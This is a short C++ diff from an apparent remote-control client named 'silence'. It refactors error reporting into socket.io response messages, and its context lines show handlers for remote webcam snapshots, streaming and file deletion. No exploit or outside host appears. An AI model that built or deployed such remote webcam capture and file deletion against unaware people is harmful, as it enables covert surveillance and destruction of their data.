@@ -95,7 +95,7 @@ namespace silence
         else if (event == "remove")
             removeEvent(commandObject);
         else
-            error(event, "Unknown event");
+            response(event, SIOSTR("Unknown event"));
     }
 
     void Client::greetEvent()
@@ -122,7 +122,7 @@ namespace silence
             camera.read(image);
             response("webcamshot", SIOBIN(impl::toBinaryString(image)));
         } catch (cv::Exception &) {
-            error("webcamshot", "No camera found");
+            response("webcamshot", SIOSTR("No camera found"));
         }
     }
 
@@ -131,7 +131,7 @@ namespace silence
         std::unique_lock<std::mutex> lockGuard(mStreamLocker);
 
         if (!mStreamRunning) {
-            error("kill_stream", "Stream is not running");
+            response("kill_stream", SIOSTR("Stream is not running"));
             return;
         }
 
@@ -143,7 +143,7 @@ namespace silence
     {
         std::unique_lock<std::mutex> lockGuard(mStreamLocker);
         if (mStreamRunning) {
-            error("start_stream", "Stream is running");
+            response("start_stream", SIOSTR("Stream is already running"));
             return;
         }
         mStreamRunning = true;
@@ -180,17 +180,6 @@ namespace silence
     void Client::removeEvent(const CommandObject &object)
     {
         response("remove", SIOBOOL(fs::remove(object.at("path")->get_string())));
-    }
-
-    void Client::error(const std::string &event, const std::string &msg)
-    {
-        mSocket->emit("error",
-                      createObject({{"event", SIOSTR(event)}, {"msg", SIOSTR(msg)}}));
-    }
-
-    void Client::info(const std::string &info)
-    {
-        mSocket->emit("info", createObject({{"msg", SIOSTR(info)}}));
     }
 
     void Client::response(const std::string &event, const sio::message::list &msg)
